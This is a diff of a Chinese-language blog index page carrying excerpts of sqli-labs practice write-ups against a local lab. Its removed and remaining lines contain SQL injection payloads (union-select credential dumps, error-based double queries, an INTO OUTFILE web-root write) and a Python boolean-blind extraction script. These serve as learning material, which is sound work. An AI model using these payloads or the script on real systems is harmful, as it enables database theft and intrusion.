@@ -197,6 +197,16 @@
         </li>
       
         
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -239,12 +249,168 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/29/sqli-labs-less11/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lilin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lilin">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/05/29/sqli-labs-less11/" itemprop="url">sqli-labs less11</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-29T21:22:42+08:00">
+                2018-05-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="LESS-11-基于字符串的注入（POST）"><a href="#LESS-11-基于字符串的注入（POST）" class="headerlink" title="LESS 11 基于字符串的注入（POST）"></a>LESS 11 基于字符串的注入（POST）</h1><p>输入单引号’测试,结果：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’’’ and password=’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/sqli-labs-less8-10/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lilin">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -281,6 +447,39 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -309,8 +508,7 @@
 
       
         
-          
-            <h1 id="LESS-8-基于布尔的盲注"><a href="#LESS-8-基于布尔的盲注" class="headerlink" title="LESS 8 基于布尔的盲注"></a>LESS 8 基于布尔的盲注</h1><p>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为好几种，本关采用基于布尔的盲注</p>
+          <h1 id="LESS-8-基于布尔的盲注"><a href="#LESS-8-基于布尔的盲注" class="headerlink" title="LESS 8 基于布尔的盲注"></a>LESS 8 基于布尔的盲注</h1><p>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为好几种，本关采用基于布尔的盲注</p>
 <p>盲注相关函数：</p>
 <ul>
 <li><p>mid(column_name,start[,length])</p>
@@ -341,16 +539,14 @@
 <li>返回字符串的长度</li>
 </ul>
 </li>
-<li>if(express,a,b)<br>  -如果express代表的表达式成立，则返回a，否则返回b</li>
 </ul>
-<p>回到本关，先输入单引号和双引号进行测试，发现单引号没有返回信息，于是判断参数是被单引号包围,构造payload测试数据库名的第一个字符:</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-8/?id=1&#39;</a> and ascii(substr(database(),1))=1%23</p>
-</blockquote>
-<p>无返回结果，由于测试量较大，使用脚本测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =  <span class="string">"http://localhost/sqli-labs-master/Less-8/?id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">length</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"查询数据库名的长度"</span></span><br><span class="line">    length =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#构造动态参数并用quote函数进行url编码</span></span><br><span class="line">        param =  <span class="string">"1' and length(database())="</span>+str(length)+<span class="string">"#"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        <span class="comment">#匹配成功代表长度正确</span></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">        <span class="comment">#失败则加1继续循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            length +=  <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">database</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"查询数据库名"</span></span><br><span class="line">    dbname =  <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span>  range(length()):</span><br><span class="line">    <span class="comment">#对128个ascii码值进行遍历并构造动态参数</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span>  range(<span class="number">128</span>):</span><br><span class="line">            param =  <span class="string">"1' and ascii(substr(database(),"</span>  +  str(n+<span class="number">1</span>) +  <span class="string">"))="</span>  +  str(a) +  <span class="string">"#"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                dbname = dbname +  chr(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line">    </span><br><span class="line">print(database())</span><br></pre></td></tr></table></figure></p>
-<p>输出结果为security<br>对于函数database()也可以采用时间复杂度更低的二分法</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/28/sqli-labs-less8-10/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -397,12 +593,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/sqli-lin/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/sqli-labs less2-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lilin">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -416,7 +612,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/28/sqli-lin/" itemprop="url">sqli-labs less2-7</a></h1>
+                <a class="post-title-link" href="/2018/05/28/sqli-labs less2-7/" itemprop="url">sqli-labs less2-7</a></h1>
         
 
         <div class="post-meta">
@@ -439,6 +635,39 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -467,8 +696,7 @@
 
       
         
-          
-            <h1 id="LESS-2-基于整形数的注入"><a href="#LESS-2-基于整形数的注入" class="headerlink" title="LESS 2 基于整形数的注入"></a>LESS 2 基于整形数的注入</h1><p>用id=’测试，发现报错，根据报错信息发现第二关的参数是整形，直接构造payload：</p>
+          <h1 id="LESS-2-基于整形数的注入"><a href="#LESS-2-基于整形数的注入" class="headerlink" title="LESS 2 基于整形数的注入"></a>LESS 2 基于整形数的注入</h1><p>用id=’测试，发现报错，根据报错信息发现第二关的参数是整形，直接构造payload：</p>
 <blockquote>
 <p><a href="http://localhost/sqli-labs-master/Less-2/?id=0" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-2/?id=0</a> union select 1,group_concat(username),group_concat(password) from users%23</p>
 </blockquote>
@@ -486,86 +714,14 @@
 </blockquote>
 <p>可以看出字符串是被双引号和括号包围的，于是构造payload：</p>
 <blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-4/?id=0&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-4/?id=0&quot;</a>) union select 1,group_concat(username),group_concat(password) from users%23</p>
-</blockquote>
-<h1 id="LESS-5-单引号双查询注入"><a href="#LESS-5-单引号双查询注入" class="headerlink" title="LESS 5 单引号双查询注入"></a>LESS 5 单引号双查询注入</h1><p>在本关内无论输入何值，都只会显示You are in………..，所以要利用双查询注入<br>先来看一下双查询注入的基本原理：</p>
-<blockquote>
-<p>有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来</p>
-</blockquote>
-<p>为了构造双查询注入语句需要先了解下面两个函数：</p>
-<ul>
-<li><p>rand()-返回0-1之间的随机数：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(), <span class="keyword">rand</span>(), <span class="keyword">rand</span>();</span><br><span class="line">+<span class="comment">--------------------+--------------------+--------------------+</span></span><br><span class="line">| rand()             | rand()             | rand()             |</span><br><span class="line">+<span class="comment">--------------------+--------------------+--------------------+</span></span><br><span class="line">| 0.5133297848639355 | 0.2455426475457313 | 0.6877239138704947 |</span><br><span class="line">+<span class="comment">--------------------+--------------------+--------------------+</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>floor()-取整，和rand联合使用可以随机返回0或者1，如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>), <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>), <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>);</span><br><span class="line">+<span class="comment">-----------------+-----------------+-----------------+</span></span><br><span class="line">| floor(rand()*2) | floor(rand()*2) | floor(rand()*2) |</span><br><span class="line">+<span class="comment">-----------------+-----------------+-----------------+</span></span><br><span class="line">|               1 |               1 |               0 |</span><br><span class="line">+<span class="comment">-----------------+-----------------+-----------------+</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>先来构造如下的查询语句，其中a是给floor(rand()*2)起的一个别名，from users的意思是对user表中的每一行都生成一次随机数0或1，group by a就是按照这些随机数0或1进行分组，最后当然是分成两组，一组为0，一组为1<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>) <span class="keyword">as</span> a <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| a |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 0 |</span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br></pre></td></tr></table></figure></p>
-<p>最后在select语句中加入count(*)，便可能会报错：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>) <span class="keyword">as</span> a <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '0' for key 'group_key'</span><br></pre></td></tr></table></figure></p>
-<p>也有可能不报错（如下所示），不过多试几次肯定会报错<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>) <span class="keyword">as</span> a <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">+<span class="comment">----------+---+</span></span><br><span class="line">| count(*) | a |</span><br><span class="line">+<span class="comment">----------+---+</span></span><br><span class="line">|        8 | 0 |</span><br><span class="line">|        5 | 1 |</span><br><span class="line">+<span class="comment">----------+---+</span></span><br></pre></td></tr></table></figure></p>
-<p>于是我们便可以把想要的数据通过字符串连接函数和floor(rand()*2)连接在一起，便可以得到想要的信息：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">CONCAT_WS</span>(<span class="built_in">CHAR</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry 'root@localhost : security : 10.1.32-MariaDB : 0' for key 'group_key'</span><br></pre></td></tr></table></figure></p>
-<p>了解了双查询注入的基本原理后便可以构造payload:</p>
-<blockquote>
-<p>这里本来想在payload中使用select子句（如下），但不知为何无论如何都不会报错</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-5/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=0&#39;</a> union select 1,count(*), CONCAT_WS(CHAR(32,58,32),concat((select group_concat(username) from security.users),(select group_concat(password) from security.users)),floor(rand()*2)) as a from information_schema.tables group by a;</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>只能在语句中使用基本的函数：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-5/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=0&#39;</a> union select 1,count(*), CONCAT_WS(CHAR(32,58,32),user(),database(),version(),floor(rand()*2)) as a from users group by a%23</p>
-<blockquote>
-<p>结果：<br>Welcome    Dhakkan<br>Duplicate entry ‘root@localhost : security : 10.1.32-MariaDB : 0’ for key ‘group_key’</p>
-</blockquote>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>（后来经过实验发现这里不报错是因为使用了group_concat函数，具体原因未知，不过可以用limit语句进行单个查询，然后再修改limit后面的数值）：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-5/?id=1%27%20union%20select%20count(\*),1,%20concat(%27~%27,(select%20email_id%20from%20emails%20limit%200,1),%27~%27,%20floor(rand()\*2))%20as%20a%20from%20information_schema.tables%20group%20by%20a%23" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1%27%20union%20select%20count(\*),1,%20concat(%27~%27,(select%20email_id%20from%20emails%20limit%200,1),%27~%27,%20floor(rand()\*2))%20as%20a%20from%20information_schema.tables%20group%20by%20a%23</a></p>
-</blockquote>
-</blockquote>
-<p>关于双查询注入更为具体的解释：</p>
-<blockquote>
-<p>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
-</blockquote>
-<h1 id="LESS-6-双引号双查询注入"><a href="#LESS-6-双引号双查询注入" class="headerlink" title="LESS 6 双引号双查询注入"></a>LESS 6 双引号双查询注入</h1><p>原理同第五关，只不过通过报错信息得出双引号替代了单引号，同理构造payload：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-6/?id=0&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-6/?id=0&quot;</a> union select 1,count(*), CONCAT_WS(CHAR(32,58,32),user(),database(),version(),floor(rand()*2)) as a from users group by a%23</p>
-</blockquote>
-<p>结果是一样的：</p>
-<blockquote>
-<p>Welcome    Dhakkan<br>Duplicate entry ‘root@localhost : security : 10.1.32-MariaDB : 0’ for key ‘group_key’</p>
-</blockquote>
-<h1 id="LESS-7-文件转储"><a href="#LESS-7-文件转储" class="headerlink" title="LESS 7 文件转储"></a>LESS 7 文件转储</h1><p>来了解一下本关要用到的新语句outfile:</p>
-<ul>
-<li><p>基本格式：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> … <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"Path/To/File"</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>作用：将检索到的内容转储到文件内</p>
-</li>
-</ul>
-<p>还需要了解的是mysql的两个系统变量datadir(数据库存放路径)和basedir(mysql安装路径)，在sql语句中字符串前加@@代表系统变量</p>
-<p>由于本关不会在页面内输出查询信息，所以可以通过文件的方式进行输出访问</p>
-<p>先第二关查询出datadir和basedir的相关信息：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-2/?id=0%20union%20select%201,@@basedir,@@datadir%23" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-2/?id=0%20union%20select%201,@@basedir,@@datadir%23</a></p>
-<blockquote>
-<p>结果：Welcome    Dhakkan<br>Your Login name:C:/xampp/mysql<br>Your Password:C:\xampp\mysql\data\</p>
-</blockquote>
-</blockquote>
-<p>xampp的www默认根目录为xampp的安装路径/htdocs,在这里就是C:/xampp/htdocs</p>
-<p>第七关的查询语句猜了了半天没猜出来。。。最后看源码发现是有两对括号和一对单引号，构造payload：</p>
-<blockquote>
-<p><a href="http://localhost/sqli-labs-master/Less-7/?id=0&#39;)" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=0&#39;)</a>) union select id,username,password from users into outfile ‘C:/xampp/htdocs/outfile.txt’%23</p>
-<blockquote>
-<p>然后在浏览器地址栏输入<a href="http://localhost/outfile.txt，结果：" target="_blank" rel="noopener">http://localhost/outfile.txt，结果：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1	Dumb	Dumb</span><br><span class="line">2	Angelina	I-kill-you</span><br><span class="line">3	Dummy	p@ssword</span><br><span class="line">4	secure	crappy</span><br><span class="line">5	stupid	stupidity</span><br><span class="line">6	superman	genious</span><br><span class="line">7	batman	mob!le</span><br><span class="line">8	admin	admin</span><br><span class="line">9	admin1	admin1</span><br><span class="line">10	admin2	admin2</span><br><span class="line">11	admin3	admin3</span><br><span class="line">12	dhakkan	dumbo</span><br><span class="line">14	admin4	admin4</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-</blockquote>
-
-          
+<p><a href="http://localhost/sqli-labs-master/Less-4/?id=0&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-4/?id=0&quot;</a>) union select 1,group_concat(username),group_concat(password) from users%23<br></p></blockquote>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/28/sqli-labs less2-7/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -612,12 +768,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/27/sqli-libs-1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/27/sqli-libs-less1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lilin">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -631,7 +787,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/05/27/sqli-libs-1/" itemprop="url">sqli-labs less1</a></h1>
+                <a class="post-title-link" href="/2018/05/27/sqli-libs-less1/" itemprop="url">sqli-labs less1</a></h1>
         
 
         <div class="post-meta">
@@ -653,6 +809,39 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -682,8 +871,7 @@
 
       
         
-          
-            <h1 id="先来了解一下MYSQL注入的基本姿势"><a href="#先来了解一下MYSQL注入的基本姿势" class="headerlink" title="先来了解一下MYSQL注入的基本姿势"></a>先来了解一下MYSQL注入的基本姿势</h1><h2 id="url编码："><a href="#url编码：" class="headerlink" title="url编码："></a>url编码：</h2><ul>
+          <h1 id="先来了解一下MYSQL注入的基本姿势"><a href="#先来了解一下MYSQL注入的基本姿势" class="headerlink" title="先来了解一下MYSQL注入的基本姿势"></a>先来了解一下MYSQL注入的基本姿势</h1><h2 id="url编码："><a href="#url编码：" class="headerlink" title="url编码："></a>url编码：</h2><ul>
 <li>url中只能含有英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号，所以要对其编码</li>
 <li>sql注入中常用的url编码有：空格%20，单引号%27，双引号%22,井号%23</li>
 </ul>
@@ -695,58 +883,14 @@
 <li><p>concat_ws（第一个参数为分隔符）</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">':'</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">+<span class="comment">--------------------------+</span></span><br><span class="line">| concat_ws(':',1,2,3,4,5) |</span><br><span class="line">+<span class="comment">--------------------------+</span></span><br><span class="line">| 1:2:3:4:5                |</span><br><span class="line">+<span class="comment">--------------------------+</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p>group_concat（将多行查询结果连接称一行）</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">"security"</span>;</span><br><span class="line">+<span class="comment">-------------------------------+</span></span><br><span class="line">| group_concat(table_name)      |</span><br><span class="line">+<span class="comment">-------------------------------+</span></span><br><span class="line">| emails,referers,uagents,users |</span><br><span class="line">+<span class="comment">-------------------------------+</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>char函数将ascii码转化成字符</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">0x23</span>,<span class="number">0x27</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">126</span>);</span><br><span class="line">+<span class="comment">---------------------------+</span></span><br><span class="line">| char(0x23,0x27,41,42,126) |</span><br><span class="line">+<span class="comment">---------------------------+</span></span><br><span class="line">| #')*~                     |</span><br><span class="line">+<span class="comment">---------------------------+</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>user函数显示当前用户，database函数显示使用数据库，version函数显示数据库名称和版本</p>
